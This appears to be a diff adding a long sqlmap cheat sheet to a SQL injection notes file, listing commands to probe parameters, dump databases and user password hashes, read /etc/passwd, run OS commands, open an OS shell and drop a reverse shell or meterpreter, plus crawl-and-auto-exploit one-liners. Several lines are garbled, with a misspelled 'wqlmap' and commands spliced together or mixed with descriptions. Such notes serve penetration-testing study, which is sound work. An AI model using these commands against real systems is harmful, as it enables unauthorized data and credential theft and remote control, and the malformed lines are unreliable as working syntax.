@@ -141,6 +141,172 @@ Q: `Inline queries`
 sqlmap -u “https://target_site.com/page?p1=value1” --technique=BEUSTQ
 ```
 
+### Basic
+
+	sqlmap -u <url> -u "<URL>"
+	
+	sqlmap -u <url> -p "<PARAM TO TEST>"
+	
+	sqlmap -u <url> --user-agent=SQLMAP
+	
+	sqlmap -u <url> --random-agent
+	
+	sqlmap -u <url> --threads=10
+	
+### Level 3 is max
+
+	wqlmap -u <url> --risk=3
+
+### Level 5 is max
+
+	sqlmap -u <url> --level=5
+
+	sqlmap -u <url> --dbms="<KNOWN DB TECH>"
+
+	sqlmap -u <url> --os="<OS>"
+
+### Use only techniques UNION and BLIND in that order (default "BEUSTQ")
+
+    sqlmap -u <url> --technique="UB"
+
+### Non interactive mode, usually Sqlmap will ask you questions, this accepts the default answers
+
+    sqlmap -u <url> --batch
+
+### HTTP authentication type (Basic, Digest, NTLM or PKI)
+
+    sqlmap -u <url> --auth-type="<AUTH>"
+
+### HTTP authentication credentials (name:password)
+
+    sqlmap -u <url> --auth-cred="<AUTH>"
+
+    sqlmap -u <url> --proxy=http://127.0.0.1:8080
+
+### Help sqlmap identify union SQLi techniques with a weird union char
+
+    sqlmap -u <url> --union-char "GsFRts2"
+
+### Get current user
+
+    sqlmap -u <url> --current-user
+
+### Check if current user is Admin
+
+    sqlmap -u <url> --is-dba
+
+### Get hostname
+
+    sqlmap -u <url> --hostname
+
+### Get usernames od DB
+
+    sqlmap -u <url> --users
+
+### Get passwords of users in DB
+
+    sqlmap -u <url> --passwords
+
+### Get privileges
+
+    sqlmap -u <url> --privileges
+
+### Retrieve everything
+
+    sqlmap -u <url> --all
+
+### Dump DBMS database table entries
+
+    sqlmap -u <url> --dump
+
+### Names of the available databases
+
+    sqlmap -u <url> --dbs
+
+### Tables of a database ( -D <DB NAME> )
+
+    sqlmap -u <url> --tables
+
+### Columns of a table  ( -D <DB NAME> -T <TABLE NAME> )
+
+    sqlmap -u <url> --columns
+
+### Dump column
+
+    sqlmap -u <url> -D <DB NAME> -T <TABLE NAME> -C <COLUMN NAME>
+
+    sqlmap -u <url> sqlmap  -u "http://example.com" --cookie "mycookies=*"
+
+    sqlmap -u <url> --string="string_showed_when_TRUE"
+
+    sqlmap -u <url> --file-read=/etc/passwd
+
+    sqlmap -u <url> --batch = non interactive mode, usually Sqlmap will ask you questions, this accepts the default answers
+
+    sqlmap -u <url> --crawl = how deep you want to crawl a site
+
+    sqlmap -u <url> --forms = Parse and test forms
+
+    sqlmap -u <url> python sqlmap.py -u "http://example.com/?id=1"  -p id --suffix="-- "
+
+    sqlmap -u <url> python sqlmap.py -u "http://example.com/?id=1"  -p id --prefix="') "
+
+    sqlmap -u <url> --tamper=name_of_the_tamper
+
+
+### Get Injection Request
+
+    sqlmap -u "http://example.com/?id=*" -p id
+
+### Post injection
+
+    sqlmap -u "http://example.com/" --data="login=blah&password=wuzi"
+
+### Inside cookie
+
+    sqlmap  -u "http://example.com" --cookie "mycookies=*"
+    sqlmap -u "http://example.com" --headers="x-forwarded-for:127.0.0.1*"
+    sqlmap -u "http://example.com" --headers="referer:*"
+
+### PUT Method
+
+    sqlmap --method=PUT -u "http://example.com" --headers="referer:*"
+
+### Eval
+
+    sqlmap -u https://foo --eval "session"
+
+### Exec command
+
+    sqlmap -u "http://example.com/?id=1" -p id --os-cmd whoami
+
+### Simple Shell
+
+    sqlmap -u "http://example.com/?id=1" -p id --os-shell
+
+### Dropping a reverse-shell / meterpreter
+
+    sqlmap -u "http://example.com/?id=1" -p id --os-pwn
+
+### Read file
+
+   sqlmap -u https://foo?id=1 --file-read=foo.txt
+
+### Crawl a website with SQLmap and auto-exploit
+
+    sqlmap -u "http://example.com/" --crawl=1 --random-agent --batch --forms --threads=5 --level=5 --risk=3
+    sqlmap --batch = non interactive mode, usually Sqlmap will ask you questions, this accepts the default answers
+    sqlmap --crawl = how deep you want to crawl a site
+    sqlmap --forms = Parse and test forms
+
+#### Get the SQL payload execution with a GET to a url
+
+    sqlmap -r login.txt -p username --second-url "http://foo/details.php"
+
+### Get the SQL payload execution sending a custom request from a file
+
+    sqlmap -r login.txt -p username --second-req details.txt
+
 ### Specify the Injection Techniques
 
 ```
@@ -167,7 +333,6 @@ When the value of --level is >= 2 it tests also HTTP Cookie header values. When 
 
 Use Default Options for the process
 Use –batch flag to use all the default options or used for non-interactive sessions. (By specifying –batch flag, sqlmap will not ask you for the (Y/N) choice rather then it will smartly choose according to the needs.)
-```
 
 ```sh
 sqlmap -u “https://target_site.com/page?p1=value1” --batch
